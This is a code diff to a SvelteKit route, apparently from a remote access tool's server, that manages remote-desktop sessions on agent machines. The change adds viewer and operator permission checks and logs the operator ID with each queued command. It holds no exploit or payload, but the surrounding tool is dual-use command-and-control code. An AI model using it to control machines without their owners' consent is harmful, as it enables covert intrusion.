@@ -1,6 +1,7 @@
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import { remoteDesktopManager, RemoteDesktopError } from '$lib/server/rat/remote-desktop';
 import type {
 	RemoteDesktopSessionResponse,
@@ -29,21 +30,25 @@ function normalizeSettings(input: Record<string, unknown>): RemoteDesktopSetting
 	return output;
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const session = remoteDesktopManager.getSessionState(id);
 	return json({ session } satisfies RemoteDesktopSessionResponse);
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let body: Record<string, unknown> = {};
 	try {
@@ -62,7 +67,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 				sessionId: session.sessionId,
 				settings: session.settings
 			};
-			registry.queueCommand(id, { name: 'remote-desktop', payload });
+			registry.queueCommand(id, { name: 'remote-desktop', payload }, { operatorId: user.id });
 		} catch (err) {
 			remoteDesktopManager.closeSession(id);
 			if (err instanceof RegistryError) {
@@ -80,11 +85,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	}
 };
 
-export const PATCH: RequestHandler = async ({ params, request }) => {
+export const PATCH: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let body: Record<string, unknown>;
 	try {
@@ -119,7 +126,7 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 			settings: updates
 		};
 		try {
-			registry.queueCommand(id, { name: 'remote-desktop', payload });
+			registry.queueCommand(id, { name: 'remote-desktop', payload }, { operatorId: user.id });
 		} catch (err) {
 			if (err instanceof RegistryError) {
 				throw error(err.status, err.message);
@@ -132,11 +139,13 @@ export const PATCH: RequestHandler = async ({ params, request }) => {
 	return json({ session: next } satisfies RemoteDesktopSessionResponse);
 };
 
-export const DELETE: RequestHandler = async ({ params, request }) => {
+export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let body: Record<string, unknown> = {};
 	try {
@@ -161,7 +170,7 @@ export const DELETE: RequestHandler = async ({ params, request }) => {
 	};
 
 	try {
-		registry.queueCommand(id, { name: 'remote-desktop', payload });
+		registry.queueCommand(id, { name: 'remote-desktop', payload }, { operatorId: user.id });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
